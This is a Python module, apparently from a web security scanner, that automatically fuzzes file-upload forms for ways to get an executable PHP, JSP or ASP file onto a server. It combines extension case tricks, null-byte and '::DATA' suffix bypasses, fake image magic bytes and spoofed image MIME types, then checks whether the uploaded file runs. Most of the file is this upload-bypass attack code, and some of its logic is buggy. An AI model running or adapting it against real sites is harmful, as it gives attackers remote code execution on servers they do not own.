# -*- coding: utf-8 -*-
"""
"* Author     : M0nk3y"
"* Version    : 2.2"
"""
import urllib.parse

import requests
import hashlib
import random
import difflib
from bs4 import BeautifulSoup
from utils.utils import print_roundtrip

headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
    'Connection': 'keep-alive',
}

def file_upload(data):
    final_data = {}
    # fuzz顺序 先正常大小写后缀, 内容加头, mimetype加上 都不行了 尝试.htaccess, 如果上传成功, 直接return 否则fuzz剩下的后缀, 但是需要返回时说明
    inputs = data['input_data']
    form_data = {}
    file_input_name = None

    for i in inputs:
        if i[2] == "file":
            file_input_name = i[0]
        else:
            form_data[i[0]] = i[1]

    form_method = data['method']
    url = data['action']

    formal_content = requests.get(url, headers=headers, verify=False).text
    if str(form_method).lower() == 'post':
        native_content, positive_content = get_content(form_method='post', url=url, file_input_name=file_input_name, data=form_data)
    else:
        native_content, positive_content = get_content(form_method='get', url=url, file_input_name=file_input_name, data=form_data)
        # 构造payload
    # fuzz出所有可能的payload
    payloads = fuzz_payloads()
    # php jsp asp
    formal_payloads = payloads["formal_list"][0] + payloads["formal_list"][1] + payloads["formal_list"][2]
    condition_payloads = payloads["condition_list"][0] + payloads["condition_list"][1] + payloads["condition_list"][2]
    payloads = formal_payloads + condition_payloads
    positive_sample = get_insert_data(formal_content, positive_content)
    negative_sample = get_insert_data(formal_content, native_content)

    # 对比上传前后页面差距， 取出增量sample，交由check_flag处理
    # 只要传上去必能执行的payload
    for item in payloads:
        real_suffix = None
        if item in formal_payloads:
            flag = 1
        else:
            (item[0], real_suffix), = item[0].items()
            flag = 2

        hl = hashlib.md5()
        hl.update(str(random.randint(10000, 1000000)).encode("utf-8"))
        file_name = hl.hexdigest()[:7]
        content_replace = hl.hexdigest()[7:13]

        num1_num2 = []
        if "string" in item[1]:
            file = {file_input_name: (file_name + '.' + item[0], item[1].replace("string", content_replace), item[2])}
        else:
            num1 = str(random.randint(10000000000, 9000000000000))
            num2 = str(random.randint(10000000000, 9000000000000))
            item[1].replace("num1", num1)
            item[1].replace("num2", num2)
            num1_num2.append(int(num1))
            num1_num2.append(int(num2))
            file = {file_input_name: (file_name + '.' + item[0], item[1], item[2])}

        if str(form_method).lower() == "post":
            r = requests.post(url=url, headers=headers, files=file, data=form_data, verify=False, hooks={"response": print_roundtrip})
            attack_sample = get_insert_data(formal_content, r.text)
            if get_result(flag, url, attack_sample, content_replace, positive_sample, negative_sample, {item[0]: real_suffix}, num1_num2):
                final_data[url] = ['file_upload', r.result]
                return final_data
        else:
            r = requests.get(url=url, headers=headers, files=file, params=form_data, verify=False, hooks={"response": print_roundtrip})
            attack_sample = get_insert_data(formal_content, r.text)
            if get_result(flag, url, attack_sample, content_replace, positive_sample, negative_sample):
                final_data[url] = ['file_upload', r.result]
                return final_data
    return None
# 检查是否上传成功
# 1. 关键字查找， 2. 相似度
def get_result(flag, origin_url, attack_sample, content_replace, positive_sample, negative_sample, condition_dict, num1_num2):
    # 计算content的md5值 看是否上传成功
    hl = hashlib.md5()
    hl.update(content_replace.encode('utf-8'))
    md5_content = hl.hexdigest()

    # 1.直接返回文件链接 先抓取增量里的所有url
    urls = cache_urls(origin_url, attack_sample,)
    if urls is not None:
        # 抓到url了,访问一下
        for url in urls:
            # 判断需要相应条件的后缀文件是否成功上传
            suffix = url.split(".")[-1].lower()
            if flag == 2:
                (upload_suffix, real_suffix), = condition_dict.items()
                if upload_suffix in attack_sample:
                    r = requests.get(url.replace(upload_suffix, real_suffix), headers=headers, verify=False)
                    if num1_num2:
                        num1 = num1_num2[0]
                        num2 = num1_num2[1]
                        if str(num1 + num2) in r.text:
                            return True
                        else:
                            return False
                    else:
                        if md5_content in r.text:
                            return True
                        # 访问过了 但是没有被转义 pass
                        else:
                            return False
                return False
                # 如果后缀不存在，也先pass
            else:
                if suffix in attack_sample:
                    r = requests.get(url, headers=headers, verify=False)
                    if any(k == suffix for k in ['jpg', 'jpeg', 'png', 'gif']):
                        # 被转义了
                        return False
                    if md5_content in r.text:
                        return True

    ban_list = ['禁止', ' fail ', ' not ', '不正确', '失败', '不允许']
    if any(ban in attack_sample for ban in ban_list):
        return False

    # 2. 判断相似度
    return cal_same(positive_sample, negative_sample, attack_sample)

def cache_urls(origin_url, attack_sample, ):
    urls = []
    soup = BeautifulSoup(attack_sample, 'html.parser')
    for link in soup.find_all('a'):
        href = link.get("href")
        if href:
            if str(href).startswith("http"):
                urls.append(href)
            else:
                urls.append(urllib.parse.urljoin(origin_url, href))

    for img in soup.find_all('img'):
        src = img.get('src')
        if src:
            if str(src).startswith("http"):
                urls.append(src)
            else:
                urls.append(urllib.parse.urljoin(origin_url, src))
    return urls

# 计算相似度
def cal_same(positive_sample, negative_sample, attack):
    same_p = difflib.SequenceMatcher(None, attack, positive_sample).ratio()
    same_n = difflib.SequenceMatcher(None, attack, negative_sample).ratio()

    # 与正向样本的距离近返回True 否则False
    if same_p >= same_n:
        return True
    else:
        return False

# 获取增量信息
def get_insert_data(origin, sample):
    matcher = difflib.SequenceMatcher(None, origin, sample)
    diff = matcher.get_opcodes()
    insert_data = ""
    for opcode, i1, i2, j1, j2 in diff:
        if opcode == 'insert':
            insert_data += sample[j1:j2] + "\n"
    return insert_data

def get_content(form_method, url, file_input_name, data):

    # TODO: 文件名随机
    #       idea 先抓取本来的页面, 再抓取上传成功的页面, diff获取多的词, 拿关键字 拿不到拿url, 拿不到对比相似度
    # post
    hl = hashlib.md5()
    hl.update(str(random.randint(10000, 1000000)).encode("utf-8"))
    file_name = hl.hexdigest()[:7]
    png_file = {file_input_name: (file_name + ".png", open('./static/files/M0nk3y.png', 'rb'), 'image/png')}
    if str(form_method).lower() == "post":
        png_content = requests.post(url=url, headers=headers, verify=False, files=png_file, data=data).text
    else:
        png_content = requests.post(url=url, headers=headers, verify=False, files=png_file, params=data).text

    # 传一个php文件
    php_file = {file_input_name:(file_name + ".php", "<?php phpinfo();?>")}
    if str(form_method).lower() == "post":
        php_content = requests.post(url=url, headers=headers, verify=False, files=php_file, data=data).text
    else:
        php_content = requests.post(url=url, headers=headers, verify=False, files=php_file, params=data).text

    return php_content, png_content


def fuzz_payloads():
    # 只要传上去就可以被解析的 多余 写的有问题 先构思不封装了
    exec_suffixes = [["php", "pHp", 'PHP', 'Php', 'PHp', 'pHP', 'phP'], ["jsp", "jSP", 'jSpx', 'JspA', 'JsPX'], ["asp", "Asp", 'AspX', 'AsaX']]

    # 需要点条件的
    need_suffixes = [[{"PHp3": "PHp3"}, {"Phtml": "Phtml"}, {'phP%00.jpg': "phP"}, {'pHp::DATA': "pHp"}, {"php. .": "php"}, {"pphphp": "php"}, {"phP.": "phP"}, {"pHP ": "pHP"}], [], []]
    htaccess = 'htaccEss'
    # [[[phpname1, phpname2, phpname3], [phpcontent, ]]
    php_formal_list = []
    jsp_formal_list = []
    asp_formal_list = []
    php_condition_list = []
    asp_condition_list = []
    jsp_condition_list = []

    php_content = ""
    jsp_content = ""
    asp_content = ""
    with open("./static/files/1.php", 'r+') as f:
        for line in f.readlines():
            php_content += line
    with open("./static/files/1.jsp", 'r+') as f:
        for line in f.readlines():
            jsp_content += line
    with open("./static/files/1.asp", 'r+') as f:
        for line in f.readlines():
            asp_content += line

    for php_payload in exec_suffixes[0]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [php_payload, head + php_content, mimetype]
                php_formal_list.append(payload)

    for php_payload in need_suffixes[0]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [php_payload, head + php_content, mimetype]
                php_condition_list.append(payload)

                # jsp  payload
    for jsp_payload in exec_suffixes[1]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [jsp_payload, head + jsp_content, mimetype]
                jsp_formal_list.append(payload)

    for jsp_payload in need_suffixes[1]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [jsp_payload, head + jsp_content, mimetype]
                jsp_condition_list.append(payload)

                # asp
    for asp_payload in exec_suffixes[2]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [asp_payload, head + asp_content, mimetype]
                asp_formal_list.append(payload)

    for asp_payload in need_suffixes[2]:
        for head in fuzz_file_content():
            for mimetype in fuzz_mimetype():
                payload = [asp_payload, head + php_content, mimetype]
                asp_condition_list.append(payload)
    formal_list = []
    formal_list.append(php_formal_list)
    formal_list.append(jsp_formal_list)
    formal_list.append(asp_formal_list)

    condition_list = []
    condition_list.append(php_condition_list)
    condition_list.append(jsp_condition_list)
    condition_list.append(asp_formal_list)

    data = {"formal_list": formal_list, "condition_list": condition_list}
    return data


def fuzz_file_content():
    return ["GIF89a\nphp:", "89504E47\nphp:", "FFD8FF\nphp:"]


def fuzz_mimetype():
    return ['image/gif', 'image/png', 'image/jpeg']